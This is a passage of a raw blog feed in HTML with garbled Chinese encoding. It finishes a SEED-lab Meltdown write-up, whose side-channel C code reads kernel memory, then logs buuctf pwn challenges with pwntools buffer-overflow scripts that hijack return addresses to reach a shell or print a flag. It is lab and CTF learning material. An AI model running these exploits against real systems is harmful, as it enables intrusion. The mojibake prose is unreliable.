¸æ•°æ®ä»ç„¶åœ¨ä»å†…å­˜åˆ°å¯„å­˜å™¨çš„è·¯ä¸Šï¼Œä¹±åºæ‰§è¡Œä¼šç«‹å³ä¸­æ–­å¹¶ä¸¢å¼ƒã€‚æˆ‘ä»¬çš„æ”»å‡»ä¹Ÿä¼šå¤±è´¥</p><p>åœ¨è¿™é‡Œå¯ä»¥å…ˆè®¿é—®/proc/secret_dataï¼Œä½¿å…¶åœ¨CPU cacheä¸­ï¼Œè¿™æ ·å¯ä»¥åŠ å¿«æ•°æ®åŠ è½½çš„é€Ÿåº¦ï¼Œä»è€Œåˆ©ç”¨ç«æ€æ¼æ´ï¼Œåœ¨å®‰å…¨æ£€æŸ¥ç»“æŸä¹‹å‰è·å¾—ä¿¡æ¯</p><p>åœ¨flushsidechannelåæ·»åŠ ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Open the /proc/secret_data virtual file.</span><br><span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/secret_data&quot;</span>, O_RDONLY);<br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;open&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">int</span> ret = pread(fd, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// Cause the secret data to be cached.</span><br></code></pre></td></tr></table></figure><p>ä¾æ—§æ˜¾ç¤º Memory access violation</p><h2 id="Task-7-3-Using-Assembly-Code-to-Trigger-Meltdown"><a href="#Task-7-3-Using-Assembly-Code-to-Trigger-Meltdown" class="headerlink" title="Task 7.3: Using Assembly Code to Trigger Meltdown"></a>Task 7.3: Using Assembly Code to Trigger Meltdown</h2><p>é€šè¿‡åœ¨å†…æ ¸å†…å­˜è®¿é—®ä¹‹å‰æ·»åŠ å‡ è¡Œæ±‡ç¼–æŒ‡ä»¤å†åšä¸€æ¬¡æ”¹è¿›ï¼Œå…³äºæ±‡ç¼–çš„å†™æ³•ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå‚è€ƒ<a href="https://meltdownattack.com/meltdown.pdf">https://meltdownattack.com/meltdown.pdf</a></p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230130204216.png"></p><h1 id="Task-8-Make-the-Attack-More-Practical"><a href="#Task-8-Make-the-Attack-More-Practical" class="headerlink" title="Task 8: Make the Attack More Practical"></a>Task 8: Make the Attack More Practical</h1><p>åŠ ä¸€å±‚å¾ªç¯å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k=<span class="hljs-number">0</span>;k&lt;<span class="hljs-number">8</span>;k++)<br>&#123;<br>  <span class="hljs-built_in">memset</span>(scores, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(scores));<br>  flushSideChannel();<br>  <br>  <br>  <span class="hljs-comment">// Retry 1000 times on the same address.</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>ret = pread(fd, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>  perror(<span class="hljs-string">&quot;pread&quot;</span>);<br>  <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// Flush the probing array</span><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">256</span>; j++) <br>_mm_clflush(&amp;<span class="hljs-built_in">array</span>[j * <span class="hljs-number">4096</span> + DELTA]);<br><br><span class="hljs-keyword">if</span> (sigsetjmp(jbuf, <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &#123; meltdown_asm(<span class="hljs-number">0xfb61b000</span>); &#125;<br><br>reloadSideChannelImproved();<br>  &#125;<br><br>  <span class="hljs-comment">// Find the index with the highest score.</span><br>  <span class="hljs-keyword">int</span> max = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br><span class="hljs-keyword">if</span> (scores[max] &lt; scores[i]) max = i;<br>  &#125;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret value is %d %c\n&quot;</span>, max, max);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ç§˜å¯†ä¿¡æ¯ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image-20230131165829797.png"></p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-pwnåˆ·é¢˜è®°å½•</title>
    <link href="/p/bdeaa012/"/>
    <url>/p/bdeaa012/</url>
    
    <content type="html"><![CDATA[<h1 id="test-your-nc1"><a href="#test-your-nc1" class="headerlink" title="test_your_nc1"></a>test_your_nc1</h1><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">- Connect to a certain port:</span><br><span class="xml">  nc </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ip_address</span>&#125;&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">port</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">- Scan the open ports of a specified host:</span><br><span class="xml">  nc -v -z </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ip_address</span>&#125;&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">port</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml">  </span><br></code></pre></td></tr></table></figure><p>ä¸‹è½½æ–‡ä»¶ï¼Œida f5ï¼Œå‘ç°è¯¥æ–‡ä»¶ç›´æ¥æ‰§è¡Œsystem(/bin/sh)</p><p><code>nc ip port </code>è·å¾—ç›®æ ‡shellï¼Œlså‘ç°flagï¼Œç›´æ¥cat flagå³å¯</p><h1 id="RIP"><a href="#RIP" class="headerlink" title="RIP"></a>RIP</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+1h] [rbp-Fh] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input&quot;</span>);<br>  gets(s, argv);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok,bye!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>shift+f12å‘ç°systemå’Œshå­—ç¬¦ä¸²éƒ½å­˜åœ¨ï¼Œçœ‹ä¸‹ä»£ç æ®µï¼š</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">.<span class="hljs-built_in">text</span>:<span class="hljs-number">000000000040118</span>A                 lea     rdi, command    ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.<span class="hljs-built_in">text</span>:<span class="hljs-number">0000000000401191</span>                 <span class="hljs-built_in">call</span>    <span class="hljs-variable">_system</span><br></code></pre></td></tr></table></figure><p>ä¿æŠ¤ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">~$</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">pwn1</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/pwn1&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæŠŠè¿”å›åœ°å€æ”¹ä¸€ä¸‹å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><span class="hljs-comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br>sh = remo(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0xf</span>+<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x40118A</span>)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="warmup-csaw-2016-1"><a href="#warmup-csaw-2016-1" class="headerlink" title="warmup_csaw_2016-1"></a>warmup_csaw_2016-1</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">~&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./warmup_csaw_2016</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/warmup_csaw_2016&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span><br></code></pre></td></tr></table></figure><p>åœ¨writeå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œniè¿è¡Œåˆ°getså‡½æ•°</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">  <span class="hljs-number">0x400692</span>    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0x40</span>] # offset<br>  <span class="hljs-number">0x400696</span>    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span><br>  <span class="hljs-number">0x400699</span>    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br>â–º <span class="hljs-number">0x40069e</span>    <span class="hljs-keyword">call</span>   gets@plt                      &lt;gets@plt&gt;<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹å †æ ˆçŠ¶æ€</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> <span class="hljs-built_in">RBP</span>  <span class="hljs-number">0x7fffffffe1c0</span> â—‚â€” <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">RSP</span>  <span class="hljs-number">0x7fffffffe140</span> â—‚â€” <span class="hljs-string">&#x27;0x40060d\n&#x27;</span><br>*<span class="hljs-built_in">RIP</span>  <span class="hljs-number">0x40069e</span> â—‚â€” <span class="hljs-keyword">call</span> <span class="hljs-number">0x400500</span><br></code></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°ä»£ç æ®µå†…å®¹ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040060D</span> sub_40060D      proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: main+34â†“o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040060D</span> <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040060D</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>000000000040060E                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400611</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, offset command <span class="hljs-comment">; &quot;cat flag.txt&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400616</span>                 <span class="hljs-keyword">call</span>    _system<br><span class="hljs-symbol">.text:</span>000000000040061B                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>000000000040061C                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>000000000040061C <span class="hljs-comment">; &#125; // starts at 40060D</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°è¿”å›åœ°å€0x0000000000400611</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><span class="hljs-comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27704</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x40</span>+<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x0000000000400611</span>)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">ciscn_2019_n_1</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/ciscn_2019_n_1&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹funcå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> v1[<span class="hljs-number">44</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-keyword">float</span> v2; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = <span class="hljs-number">0.0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s guess the number.&quot;</span>);<br>  gets(v1);<br>  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">11.28125</span> )<br>    result = system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Its value should be 11.28125&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥è·³åˆ°cat /flagä»£ç å¤„å³å¯</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>BE                 <span class="hljs-keyword">mov</span>     edi, offset command <span class="hljs-comment">; &quot;cat /flag&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>C3                 <span class="hljs-keyword">mov</span>     eax, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>C8                 <span class="hljs-keyword">call</span>    _system<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><span class="hljs-comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">26563</span>)<br><br>target = <span class="hljs-number">0x00000000004006BE</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>) + p64(target)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"> <span class="hljs-string">~&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">pwn1_sctf_2016</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/pwn1_sctf_2016&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-3Ch] BYREF</span><br>  <span class="hljs-keyword">char</span> v3[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+3Ch] [ebp-1Ch] BYREF</span><br>  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+40h] [ebp-18h] BYREF</span><br>  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [esp+47h] [ebp-11h] BYREF</span><br>  <span class="hljs-keyword">char</span> v6[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+48h] [ebp-10h] BYREF</span><br>  <span class="hljs-keyword">char</span> v7[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [esp+4Fh] [ebp-9h] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tell me something about yourself: &quot;</span>);<br>  <span class="hljs-built_in">fgets</span>(s, <span class="hljs-number">32</span>, edata);<br>  std::string::<span class="hljs-keyword">operator</span>=(&amp;input, s);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v5);<br>  std::string::<span class="hljs-built_in">string</span>(v4, <span class="hljs-string">&quot;you&quot;</span>, &amp;v5);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(v7);<br>  std::string::<span class="hljs-built_in">string</span>(v6, <span class="hljs-string">&quot;I&quot;</span>, v7);<br>  <span class="hljs-built_in">replace</span>((std::string *)v3);<br>  std::string::<span class="hljs-keyword">operator</span>=(&amp;input, v3, v6, v4); <span class="hljs-comment">// å…³æ³¨è¿™ä¸€è¡Œ</span><br>  std::string::~<span class="hljs-built_in">string</span>(v3);<br>  std::string::~<span class="hljs-built_in">string</span>(v6);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(v7);<br>  std::string::~<span class="hljs-built_in">string</span>(v4);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v5);<br>  v0 = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)std::string::<span class="hljs-built_in">c_str</span>((std::string *)&amp;input);<br>  <span class="hljs-built_in">strcpy</span>(s, v0);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;So, %s\n&quot;</span>, s);<br>&#125;<br></code></pre></td></tr></table></figure><p>C++é€†å‡ºæ¥çš„ç¡®å®çœ‹ä¸æ‡‚ï¼Œå¤§æ¦‚å°±æ˜¯ä½ è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­çš„Iä¼šè¢«youæ›¿æ¢ï¼Œç„¶åæŠŠå¤„ç†åçš„å­—ç¬¦ä¸²strcpyç»™s</p><p>æ‰€ä»¥å¾ˆæ˜æ˜¾å­—ç¬¦ä¸²å˜é•¿äº†ï¼Œè™½ç„¶fgetsæŒ‡å®šäº†å­—ç¬¦æ•°é‡ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªæ›¿æ¢çš„å­˜åœ¨ï¼Œæœ‰å¯èƒ½å†²æ‰è¿”å›åœ°å€</p><p>såœ¨æ ˆä¸Šçš„ä½ç½®æ˜¯ebp-3Chï¼Œå› æ­¤åç§»ä¸º0x3c+4=64å­—èŠ‚ï¼Œæˆ‘ä»¬è¾“å…¥21ä¸ªIï¼Œå¯ä»¥å¾—åˆ°63å­—èŠ‚</p><p>çœ‹ä¸€ä¸‹è¿”å›åœ°å€</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">.<span class="hljs-keyword">text</span>:<span class="hljs-number">08048</span>F13                 mov     dword ptr [esp], <span class="hljs-built_in">offset</span> <span class="hljs-keyword">command</span> ; <span class="hljs-string">&quot;cat flag.txt&quot;</span><br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">08048</span>F1A                 call    <span class="hljs-title">_system</span><br></code></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs clean">#!/usr/bin/python3<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>#context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>#context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span 